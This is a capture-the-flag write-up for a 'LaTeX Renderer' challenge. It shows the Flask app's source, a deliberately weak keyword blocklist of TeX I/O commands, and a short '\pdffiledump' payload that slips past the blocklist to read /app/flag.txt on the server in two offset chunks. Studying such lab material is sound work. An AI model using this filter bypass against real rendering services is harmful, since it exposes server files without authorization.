# LaTeX Renderer

<figure><img src="../../../../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>Flag @ /app/flag.txt</p></figcaption></figure>

### Source code



```python
import os
import re
import subprocess
from flask import Flask, request, send_file
import random
import string

app = Flask(__name__)


graylist = [
    "^^",
    "afterassignment",
    "aftergroup",
    "batchmode",
    "catcode",
    "closein",
    "closeout",
    "command",
    "document",
    "def",
    "errhelp",
    "errcontextlines",
    "errorstopmode",
    "every",
    "expand",
    "expandafter",
    "immediate",
    "include",
    "input",
    "jobname",
    "loop",
    "lowercase",
    "makeat",
    "meaning",
    "message",
    "named",
    "newhelp",
    "noexpand",
    "nonstopmode",
    "open",
    "output",
    "pagestyle",
    "package",
    "pathname",
    "read",
    "relax",
    "repeat",
    "shipout",
    "show",
    "scrollmode",
    "special",
    "syscall",
    "toks",
    "tracing",
    "typeout",
    "typein",
    "uppercase",
    "write",
]

wrapper = "\\documentclass[12pt]{article}\n\\usepackage[latin1]{inputenc}\n\\usepackage{amsmath}\n\\usepackage{amsfonts}\n\\usepackage{amssymb}\n\\usepackage[mathscr]{eucal}\n\\pagestyle{empty}"


def generate_random_string(length=5):
    """Generate a random string of a specified length."""
    letters = string.ascii_letters + string.digits
    return "".join(random.choice(letters) for _ in range(length))


@app.route("/", methods=["GET"])
def index():
    return "Welcome Hacker! go grab your easy win."


@app.route("/render", methods=["GET"])
def render_latex():
    try:
        latex = request.args.get("latex", "")

        for word in graylist:
            if word in latex:
                return {"error": f"Graylist word detected."}, 403

        latex = wrapper + "\n\\begin{document}\n" + latex + "\n\\end{document}"
        rand = generate_random_string()
        path = f"temp_{rand}"
        with open(f"{path}.tex", "w") as f:
            f.write(latex)

        subprocess.run(["latexmk", "-pdf", "-interaction=nonstopmode", f"{path}.tex"])

        return send_file(
            f"{path}.pdf", as_attachment=True, download_name="rendered_pdf.pdf"
        )

    except Exception:
        return {"error": "hmm amigo.."}, 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

### Payload



This task has filters that fobid us from reach I/O functions of LATEx

but \pdffiledump isn't graylisted

Crafting the payload&#x20;

<pre class="language-latex"><code class="lang-latex"><strong>\pdffiledump offset 0 length 1000 {/app/flag.txt}
</strong></code></pre>

<figure><img src="../../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we got a part of the flag we need the missing piece

<figure><img src="../../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Part II payload , added offset

```latex
\pdffiledump offset 30 length 1000 {/app/flag.txt}
```

<figure><img src="../../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Boom

<figure><img src="../../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
